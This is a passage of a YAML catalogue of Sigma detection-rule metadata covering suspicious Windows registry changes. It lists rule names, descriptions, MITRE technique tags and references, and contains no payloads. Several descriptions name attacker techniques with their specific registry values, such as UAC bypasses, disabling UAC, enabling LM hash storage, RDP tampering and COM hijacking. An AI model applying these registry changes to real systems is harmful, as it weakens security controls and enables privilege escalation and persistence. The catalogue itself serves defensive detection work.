  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques:
  - T1588.002
  tags:
  - attack.resource-development
  - attack.t1588.002
  time_window: ''
  references:
  - https://renenyffenegger.ch/notes/Windows/registry/tree/HKEY_CURRENT_USER/Keyboard-Layout/Preload/index
  - https://github.com/SwiftOnSecurity/sysmon-config/pull/92/files
  false_positives:
  - Administrators or users that actually use the selected keyboard layouts (heavily
    depends on the organisation's user base)
  notes: ''
- detection_id: 4eec988f-7bf0-49f1-8675-1e6a510b3a2a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_susp_pendingfilerenameoperations.yml
  name: Potential PendingFileRenameOperations Tampering
  description: 'Detect changes to the "PendingFileRenameOperations" registry key from
    uncommon or suspicious images locations to stage currently used files for rename
    or deletion after reboot.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques:
  - T1036.003
  tags:
  - attack.defense-evasion
  - attack.t1036.003
  time_window: ''
  references:
  - https://any.run/report/3ecd4763ffc944fdc67a9027e459cd4f448b1a8d1b36147977afaf86bbf2a261/64b0ba45-e7ce-423b-9a1d-5b4ea59521e6
  - https://devblogs.microsoft.com/scripting/determine-pending-reboot-statuspowershell-style-part-1/
  - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc960241(v=technet.10)?redirectedfrom=MSDN
  - https://www.trendmicro.com/en_us/research/21/j/purplefox-adds-new-backdoor-that-uses-websockets.html
  - https://www.trendmicro.com/en_us/research/19/i/purple-fox-fileless-malware-with-rookit-component-delivered-by-rig-exploit-kit-now-abuses-powershell.html
  false_positives:
  - Installers and updaters may set currently in use files for rename or deletion
    after a reboot.
  notes: ''
- detection_id: e0813366-0407-449a-9869-a2db1119dc41
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_susp_printer_driver.yml
  name: Suspicious Printer Driver Empty Manufacturer
  description: Detects a suspicious printer driver installation with an empty Manufacturer
    value
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1574
  - cve.2021-1675
  time_window: ''
  references:
  - https://twitter.com/SBousseaden/status/1410545674773467140
  false_positives:
  - Alerts on legitimate printer drivers that do not set any more details in the Manufacturer
    value
  notes: ''
- detection_id: b7916c2a-fa2f-4795-9477-32b731f70f11
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_susp_reg_persist_explorer_run.yml
  name: Registry Persistence via Explorer Run Key
  description: Detects a possible persistence mechanism using RUN key for Windows
    Explorer and pointing to a suspicious folder
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1547.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1547.001
  time_window: ''
  references:
  - https://researchcenter.paloaltonetworks.com/2018/07/unit42-upatre-continues-evolve-new-anti-analysis-techniques/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 02ee49e2-e294-4d0f-9278-f5b3212fc588
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_susp_run_key_img_folder.yml
  name: New RUN Key Pointing to Suspicious Folder
  description: Detects suspicious new RUN key element pointing to an executable in
    a suspicious folder
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1547.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1547.001
  time_window: ''
  references:
  - https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html
  - https://github.com/HackTricks-wiki/hacktricks/blob/e4c7b21b8f36c97c35b7c622732b38a189ce18f7/src/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.md
  false_positives:
  - Software using weird folders for updates
  notes: ''
- detection_id: 7a1b4c5e-8f3d-4b9a-7c2e-1f4a5b8c6d9e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_susp_runmru_space_character.yml
  name: Suspicious Space Characters in RunMRU Registry Path - ClickFix
  description: 'Detects the occurrence of numerous space characters in RunMRU registry
    paths, which may indicate execution via phishing lures using clickfix techniques
    to hide malicious commands in the Windows Run dialog box from naked eyes.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027.010
  - T1204.004
  tags:
  - attack.execution
  - attack.t1204.004
  - attack.defense-evasion
  - attack.t1027.010
  time_window: ''
  references:
  - https://expel.com/blog/cache-smuggling-when-a-picture-isnt-a-thousand-words/
  - https://github.com/JohnHammond/recaptcha-phish
  false_positives:
  - Unlikely
  notes: ''
- detection_id: f2485272-a156-4773-82d7-1d178bc4905b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_susp_service_installed.yml
  name: Suspicious Service Installed
  description: 'Detects installation of NalDrv or PROCEXP152 services via registry-keys
    to non-system32 folders.

    Both services are used in the tool Ghost-In-The-Logs (https://github.com/bats3c/Ghost-In-The-Logs),
    which uses KDU (https://github.com/hfiref0x/KDU)

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.t1562.001
  - attack.defense-evasion
  time_window: ''
  references:
  - https://web.archive.org/web/20200419024230/https://blog.dylan.codes/evading-sysmon-and-windows-event-logging/
  false_positives:
  - Other legimate tools using this service names and drivers. Note - clever attackers
    may easily bypass this detection by just renaming the services. Therefore just
    Medium-level and don't rely on it.
  notes: ''
- detection_id: 8f2a5c3d-9e4b-4a7c-8d1f-2e5a6b9c3d7e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_susp_typedpaths_space_characters.yml
  name: Suspicious Space Characters in TypedPaths Registry Path - FileFix
  description: 'Detects the occurrence of numerous space characters in TypedPaths
    registry paths, which may indicate execution via phishing lures using file-fix
    techniques to hide malicious commands.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027.010
  - T1204.004
  tags:
  - attack.execution
  - attack.t1204.004
  - attack.defense-evasion
  - attack.t1027.010
  time_window: ''
  references:
  - https://expel.com/blog/cache-smuggling-when-a-picture-isnt-a-thousand-words/
  - https://mrd0x.com/filefix-clickfix-alternative/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 9c226817-8dc9-46c2-a58d-66655aafd7dc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_susp_user_shell_folders.yml
  name: Modify User Shell Folders Startup Value
  description: Detect modification of the startup key to a path where a payload could
    be stored to be launched during startup
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1547.001
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1547.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/9e5b12c4912c07562aec7500447b11fa3e17e254/atomics/T1547.001/T1547.001.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1f1d8209-636e-4c6c-a137-781cca8b82f9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_susp_wfp_filter_added.yml
  name: WFP Filter Added via Registry
  description: 'Detects registry modifications that add Windows Filtering Platform
    (WFP) filters, which may be used to block security tools and EDR agents from reporting
    events.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: experimental
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1562
  - T1569.002
  tags:
  - attack.defense-evasion
  - attack.execution
  - attack.t1562
  - attack.t1569.002
  time_window: ''
  references:
  - https://github.com/netero1010/EDRSilencer/blob/0e73a7037ec65c52894d8208e6f605a7da0a34a6/EDRSilencer.c
  - https://www.huntress.com/blog/silencing-the-edr-silencers
  - https://www.trendmicro.com/en_us/research/24/j/edrsilencer-disrupting-endpoint-security-solutions.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 966315ef-c5e1-4767-ba25-fce9c8de3660
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_suspicious_env_variables.yml
  name: Suspicious Environment Variable Has Been Registered
  description: Detects the creation of user-specific or system-wide environment variables
    via the registry. Which contains suspicious commands and strings
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.defense-evasion
  - attack.persistence
  time_window: ''
  references:
  - https://infosec.exchange/@sbousseaden/109542254124022664
  false_positives:
  - Unknown
  notes: ''
- detection_id: c420410f-c2d8-4010-856b-dffe21866437
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_system_lsa_nolmhash.yml
  name: Enable LM Hash Storage
  description: 'Detects changes to the "NoLMHash" registry value in order to allow
    Windows to store LM Hashes.

    By setting this registry value to "0" (DWORD), Windows will be allowed to store
    a LAN manager hash of your password in Active Directory and local SAM databases.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1112
  time_window: ''
  references:
  - https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-347a
  - https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/prevent-windows-store-lm-hash-password
  - https://www.sans.org/blog/protecting-privileged-domain-accounts-lm-hashes-the-good-the-bad-and-the-ugly/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 4720b7df-40c3-48fd-bbdf-fd4b3c464f0d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_taskcache_entry.yml
  name: Scheduled TaskCache Change by Uncommon Program
  description: Monitor the creation of a new key under 'TaskCache' when a new scheduled
    task is registered by a process that is not svchost.exe, which is suspicious
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053
  - T1053.005
  tags:
  - attack.privilege-escalation
  - attack.execution
  - attack.persistence
  - attack.t1053
  - attack.t1053.005
  time_window: ''
  references:
  - https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/
  - https://labs.f-secure.com/blog/scheduled-task-tampering/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 73a883d0-0348-4be4-a8d8-51031c2564f8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_telemetry_persistence.yml
  name: Potential Registry Persistence Attempt Via Windows Telemetry
  description: 'Detects potential persistence behavior using the windows telemetry
    registry key.

    Windows telemetry makes use of the binary CompatTelRunner.exe to run a variety
    of commands and perform the actual telemetry collections.

    This binary was created to be easily extensible, and to that end, it relies on
    the registry to instruct on which commands to run.

    The problem is, it will run any arbitrary command without restriction of location
    or type.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053.005
  tags:
  - attack.privilege-escalation
  - attack.execution
  - attack.persistence
  - attack.t1053.005
  time_window: ''
  references:
  - https://www.trustedsec.com/blog/abusing-windows-telemetry-for-persistence/
  false_positives:
  - Unknown
  notes: ''
- detection_id: a2863fbc-d5cb-48d5-83fb-d976d4b1743b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_terminal_server_suspicious.yml
  name: RDP Sensitive Settings Changed to Zero
  description: 'Detects tampering of RDP Terminal Service/Server sensitive settings.

    Such as allowing unauthorized users access to a system via the ''fAllowUnsolicited''
    or enabling RDP via ''fDenyTSConnections'', etc.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.t1112
  time_window: ''
  references:
  - https://web.archive.org/web/20200929062532/https://blog.menasec.net/2019/02/threat-hunting-rdp-hijacking-via.html
  - http://woshub.com/rds-shadow-how-to-connect-to-a-user-session-in-windows-server-2012-r2/
  - https://twitter.com/SagieSec/status/1469001618863624194?t=HRf0eA0W1YYzkTSHb-Ky1A&s=03
  - https://threathunterplaybook.com/hunts/windows/190407-RegModEnableRDPConnections/notebook.html
  - https://bazaar.abuse.ch/sample/6f3aa9362d72e806490a8abce245331030d1ab5ac77e400dd475748236a6cc81/
  - http://etutorials.org/Microsoft+Products/microsoft+windows+server+2003+terminal+services/Chapter+6+Registry/Registry+Keys+for+Terminal+Services/
  - https://admx.help/HKLM/SOFTWARE/Policies/Microsoft/Windows%20NT/Terminal%20Services
  false_positives:
  - Some of the keys mentioned here could be modified by an administrator while setting
    group policy (it should be investigated either way)
  notes: ''
- detection_id: 3f6b7b62-61aa-45db-96bd-9c31b36b653c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_terminal_server_tampering.yml
  name: RDP Sensitive Settings Changed
  description: 'Detects tampering of RDP Terminal Service/Server sensitive settings.

    Such as allowing unauthorized users access to a system via the ''fAllowUnsolicited''
    or enabling RDP via ''fDenyTSConnections'', etc.


    Below is a list of registry keys/values that are monitored by this rule:


    - Shadow: Used to enable Remote Desktop shadowing, which allows an administrator
    to view or control a user''s session.

    - DisableRemoteDesktopAntiAlias: Disables anti-aliasing for remote desktop sessions.

    - DisableSecuritySettings: Disables certain security settings for Remote Desktop
    connections.

    - fAllowUnsolicited: Allows unsolicited remote assistance offers.

    - fAllowUnsolicitedFullControl: Allows unsolicited remote assistance offers with
    full control.

    - InitialProgram: Specifies a program to run automatically when a user logs on
    to a remote computer.

    - ServiceDll: Used in RDP hijacking techniques to specify a custom DLL to be loaded
    by the Terminal Services service.

    - SecurityLayer: Specifies the security layer used for RDP connections.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.t1112
  time_window: ''
  references:
  - http://etutorials.org/Microsoft+Products/microsoft+windows+server+2003+terminal+services/Chapter+6+Registry/Registry+Keys+for+Terminal+Services/
  - http://woshub.com/rds-shadow-how-to-connect-to-a-user-session-in-windows-server-2012-r2/
  - https://admx.help/HKLM/SOFTWARE/Policies/Microsoft/Windows%20NT/Terminal%20Services
  - https://bazaar.abuse.ch/sample/6f3aa9362d72e806490a8abce245331030d1ab5ac77e400dd475748236a6cc81/
  - https://blog.sekoia.io/darkgate-internals/
  - https://blog.talosintelligence.com/understanding-the-phobos-affiliate-structure/
  - https://github.com/redcanaryco/atomic-red-team/blob/02c7d02fe1f1feb0fc7944550408ea8224273994/atomics/T1112/T1112.md#atomic-test-63---disable-remote-desktop-anti-alias-setting-through-registry
  - https://github.com/redcanaryco/atomic-red-team/blob/02c7d02fe1f1feb0fc7944550408ea8224273994/atomics/T1112/T1112.md#atomic-test-64---disable-remote-desktop-security-settings-through-registry
  - https://github.com/redcanaryco/atomic-red-team/blob/dd526047b8c399c312fee47d1e6fb531164da54d/atomics/T1112/T1112.yaml#L790
  - https://learn.microsoft.com/en-us/windows-hardware/customize/desktop/unattend/microsoft-windows-terminalservices-rdp-winstationextensions-securitylayer
  - https://threathunterplaybook.com/hunts/windows/190407-RegModEnableRDPConnections/notebook.html
  - https://twitter.com/SagieSec/status/1469001618863624194?t=HRf0eA0W1YYzkTSHb-Ky1A&s=03
  - https://web.archive.org/web/20200929062532/https://blog.menasec.net/2019/02/threat-hunting-rdp-hijacking-via.html
  - https://www.trendmicro.com/en_us/research/25/i/unmasking-the-gentlemen-ransomware.html
  false_positives:
  - Some of the keys mentioned here could be modified by an administrator while setting
    group policy (it should be investigated either way)
  notes: ''
- detection_id: e88a6ddc-74f7-463b-9b26-f69fc0d2ce85
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_timeproviders_dllname.yml
  name: New TimeProviders Registered With Uncommon DLL Name
  description: 'Detects processes setting a new DLL in DllName in under HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProvider.

    Adversaries may abuse time providers to execute DLLs when the system boots.

    The Windows Time service (W32Time) enables time synchronization across and within
    domains.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1547.003
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1547.003
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1547.003/T1547.003.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 439957a7-ad86-4a8f-9705-a28131c6821b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_tls_protocol_old_version_enabled.yml
  name: Old TLS1.0/TLS1.1 Protocol Version Enabled
  description: Detects applications or users re-enabling old TLS versions by setting
    the "Enabled" value to "1" for the "Protocols" registry key.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://techcommunity.microsoft.com/t5/windows-it-pro-blog/tls-1-0-and-tls-1-1-soon-to-be-disabled-in-windows/ba-p/3887947
  false_positives:
  - Legitimate enabling of the old tls versions due to incompatibility
  notes: ''
- detection_id: dc5c24af-6995-49b2-86eb-a9ff62199e82
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_treatas_persistence.yml
  name: COM Hijacking via TreatAs
  description: Detect modification of TreatAs key to enable "rundll32.exe -sta" command
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1546.015
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1546.015
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1546.015/T1546.015.md
  - https://www.youtube.com/watch?v=3gz1QmiMhss&t=1251s
  false_positives:
  - Legitimate use
  notes: ''
- detection_id: b110ebaf-697f-4da1-afd5-b536fa27a2c1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_turn_on_dev_features.yml
  name: Potential Signing Bypass Via Windows Developer Features - Registry
  description: Detects when the enablement of developer features such as "Developer
    Mode" or "Application Sideloading". Which allows the user to install untrusted
    packages.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://twitter.com/malmoeb/status/1560536653709598721
  - https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 7c81fec3-1c1d-43b0-996a-46753041b1b6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_uac_bypass_eventvwr.yml
  name: UAC Bypass via Event Viewer
  description: Detects UAC bypass method using Windows event viewer
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques:
  - T1548.002
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1548.002
  - car.2019-04-001
  time_window: ''
  references:
  - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
  - https://www.hybrid-analysis.com/sample/e122bc8bf291f15cab182a5d2d27b8db1e7019e4e96bb5cdbd1dfe7446f3f51f?environmentId=100
  false_positives:
  - Unknown
  notes: ''
- detection_id: 5b872a46-3b90-45c1-8419-f675db8053aa
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_uac_bypass_sdclt.yml
  name: UAC Bypass via Sdclt
  description: Detects the pattern of UAC Bypass using registry key manipulation of
    sdclt.exe (e.g. UACMe 53)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques:
  - T1548.002
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1548.002
  - car.2019-04-001
  time_window: ''
  references:
  - https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/
  - https://github.com/hfiref0x/UACME
  false_positives:
  - Unknown
  notes: ''
- detection_id: 6597be7b-ac61-4ac8-bef4-d3ec88174853
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_uac_bypass_winsat.yml
  name: UAC Bypass Abusing Winsat Path Parsing - Registry
  description: Detects the pattern of UAC Bypass using a path parsing issue in winsat.exe
    (UACMe 52)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques:
  - T1548.002
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1548.002
  time_window: ''
  references:
  - https://github.com/hfiref0x/UACME
  false_positives:
  - Unknown
  notes: ''
- detection_id: 5f9db380-ea57-4d1e-beab-8a2d33397e93
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_uac_bypass_wmp.yml
  name: UAC Bypass Using Windows Media Player - Registry
  description: Detects the pattern of UAC Bypass using Windows Media Player osksupport.dll
    (UACMe 32)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques:
  - T1548.002
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1548.002
  time_window: ''
  references:
  - https://github.com/hfiref0x/UACME
  false_positives:
  - Unknown
  notes: ''
- detection_id: 48437c39-9e5f-47fb-af95-3d663c3f2919
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_uac_disable.yml
  name: UAC Disabled
  description: 'Detects when an attacker tries to disable User Account Control (UAC)
    by setting the registry value "EnableLUA" to 0.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: stable
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques:
  - T1548.002
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.t1548.002
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/7e11e9b79583545f208a6dc3fa062f2ed443d999/atomics/T1548.002/T1548.002.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: c5f6a85d-b647-40f7-bbad-c10b66bab038
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_uac_disable_notification.yml
  name: UAC Notification Disabled
  description: 'Detects when an attacker tries to disable User Account Control (UAC)
    notification by tampering with the "UACDisableNotify" value.

    UAC is a critical security feature in Windows that prevents unauthorized changes
    to the operating system. It prompts the user for permission or an administrator
    password before allowing actions that could affect the system''s operation or
    change settings that affect other users.

    When "UACDisableNotify" is set to 1, UAC prompts are suppressed.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques:
  - T1548.002
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.t1548.002
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/7e11e9b79583545f208a6dc3fa062f2ed443d999/atomics/T1548.002/T1548.002.md
  - https://securityintelligence.com/x-force/x-force-hive0129-targeting-financial-institutions-latam-banking-trojan/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 0d7ceeef-3539-4392-8953-3dc664912714
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_uac_disable_secure_desktop_prompt.yml
  name: UAC Secure Desktop Prompt Disabled
  description: 'Detects when an attacker tries to change User Account Control (UAC)
    elevation request destination via the "PromptOnSecureDesktop" value.

    The "PromptOnSecureDesktop" setting specifically determines whether UAC prompts
    are displayed on the secure desktop. The secure desktop is a separate desktop
    environment that''s isolated from other processes running on the system. It''s
    designed to prevent malicious software from intercepting or tampering with UAC
    prompts.

    When "PromptOnSecureDesktop" is set to 0, UAC prompts are displayed on the user''s
    current desktop instead of the secure desktop. This reduces the level of security
    because it potentially exposes the prompts to manipulation by malicious software.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques:
  - T1548.002
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.t1548.002
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/7e11e9b79583545f208a6dc3fa062f2ed443d999/atomics/T1548.002/T1548.002.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 46490193-1b22-4c29-bdd6-5bf63907216f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_vbs_payload_stored.yml
  name: VBScript Payload Stored in Registry
  description: Detects VBScript content stored into registry keys as seen being used
    by UNC2452 group
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1547.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1547.001
  time_window: ''
  references:
  - https://www.microsoft.com/security/blog/2021/03/04/goldmax-goldfinder-sibot-analyzing-nobelium-malware/
  false_positives:
  - Unknown
